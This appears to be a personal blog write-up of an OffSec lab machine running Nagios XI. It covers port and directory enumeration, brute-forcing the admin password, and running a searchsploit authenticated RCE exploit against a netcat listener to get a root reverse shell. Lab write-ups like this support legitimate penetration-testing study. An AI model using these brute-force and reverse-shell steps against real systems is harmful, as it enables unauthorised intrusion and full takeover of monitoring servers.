---
title: "Monitoring Writeup"
date: 2025-09-09T07:00:00+09:00
# weight: 1
# aliases: ["/first"]
tags: ["pen-testing", "hacking"]
author: "Me"
categories: ["Penetration Testing"]
# author: ["Me", "You"] # multiple authors

showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Offsec PGP lab Monitoring Writeup"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "posts/cover/offsec.png" # image path/url
    alt: "cover-image"

editPost:
    URL: "https://github.com/hynseok/blog/blob/main/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

```
local ip : 192.168.45.231  
remote ip : 192.168.152.136
```

## Enumeration
### Nmap

command
```shell
sudo nmap -p- -T4 target
```

result
```shell
Not shown: 65498 closed tcp ports (reset), 31 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown
```

command
```shell
sudo nmap -sV -sC -p 22,25,80,389,443,5667 -T4 target
```

result
```shell
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
25/tcp   open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-09-08T17:59:00
|_Not valid after:  2030-09-06T17:59:00
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Nagios XI
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-09-08T18:28:08
|_Not valid after:  2030-09-06T18:28:08
|_ssl-date: TLS randomness does not represent time
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
5667/tcp open  tcpwrapped
Service Info: Hosts:  ubuntu, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Gobuster

command
```shell
gobuster dir -u http://target -w /usr/share/wordlists/dirb/big.txt -t 50 
```

result
```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 271]
/.htpasswd            (Status: 403) [Size: 271]
/cgi-bin/             (Status: 403) [Size: 271]
/javascript           (Status: 301) [Size: 305] [--> http://target/javascript/]
/nagios               (Status: 401) [Size: 453]
/server-status        (Status: 403) [Size: 271]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

command
```shell
gobuster dir -u http://target/nagiosxi/ -w /usr/share/wordlists/dirb/big.txt -t 50 
```

result
```shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 271]
/.htaccess            (Status: 403) [Size: 271]
/about                (Status: 301) [Size: 309] [--> http://target/nagiosxi/about/]
/account              (Status: 301) [Size: 311] [--> http://target/nagiosxi/account/]
/admin                (Status: 301) [Size: 309] [--> http://target/nagiosxi/admin/]
/api                  (Status: 301) [Size: 307] [--> http://target/nagiosxi/api/]
/backend              (Status: 301) [Size: 311] [--> http://target/nagiosxi/backend/]
/config               (Status: 301) [Size: 310] [--> http://target/nagiosxi/config/]
/db                   (Status: 301) [Size: 306] [--> http://target/nagiosxi/db/]
/help                 (Status: 301) [Size: 308] [--> http://target/nagiosxi/help/]
/images               (Status: 301) [Size: 310] [--> http://target/nagiosxi/images/]
/includes             (Status: 301) [Size: 312] [--> http://target/nagiosxi/includes/]
/reports              (Status: 301) [Size: 311] [--> http://target/nagiosxi/reports/]
/tools                (Status: 301) [Size: 309] [--> http://target/nagiosxi/tools/]
/views                (Status: 301) [Size: 309] [--> http://target/nagiosxi/views/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
- 대부분의 페이지는 인증에 필터링되어 `login.php`로 리다이렉트 되었습니다.
## Exploitation

### Nagios XI Authentication Bruteforcing
- 구글링 결과 nagios xi 서비스의 default credential은 nagiosadmin:password라고 나와있었습니다. 그러나 해당 정보로 로그인이 되지 않아 burp intruder를 통해 브루트 포싱을 진행했습니다.

![monitoring-1](images/monitoring/monitoring-1.png)
- `admin`이 비밀번호임을 확인했습니다.

### exploit with searchsploit
```shell
searchsploit nagios xi

...
agios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit)               | linux/remote/44969.rb
Nagios XI 5.2.7 - Multiple Vulnerabilities                                        | php/webapps/39899.txt
Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution (Metasploit)        | linux/remote/47039.rb
Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation                    | linux/webapps/46221.py
Nagios XI 5.6.1 - SQL injection                                                   | php/webapps/46910.txt
Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution                         | php/webapps/48640.txt
Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation               | php/webapps/47299.php
Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE)                       | multiple/webapps/52138.txt
Nagios XI 5.7.3 - 'Contact Templates' Persistent Cross-Site Scripting             | php/webapps/48893.txt
Nagios XI 5.7.3 - 'Manage Users' Authenticated SQL Injection                      | php/webapps/48894.txt
Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated)             | php/webapps/48959.py
Nagios XI 5.7.3 - 'SNMP Trap Interface' Authenticated SQL Injection               | php/webapps/48895.txt
Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting                        | php/webapps/49449.txt
Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)                       | php/webapps/49422.py
...
```
- 많은 exploit이 발견되었고, 그중  `Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE)`를 사용합니다.
```shell
searchsploit -m 52138.txt
mv 52138.txt exploit.py
```

```shell
# session1
nc -nvlp 4444

# session2
python3 exploit.py -t https://target -b /nagiosxi -u nagiosadmin -p admin -lh 192.168.45.231 -lp 4444 -k
```
- exploit을 실행하여 reverse shell을 얻어냅니다.
- shell이 root로 로그인되어 얻어집니다.
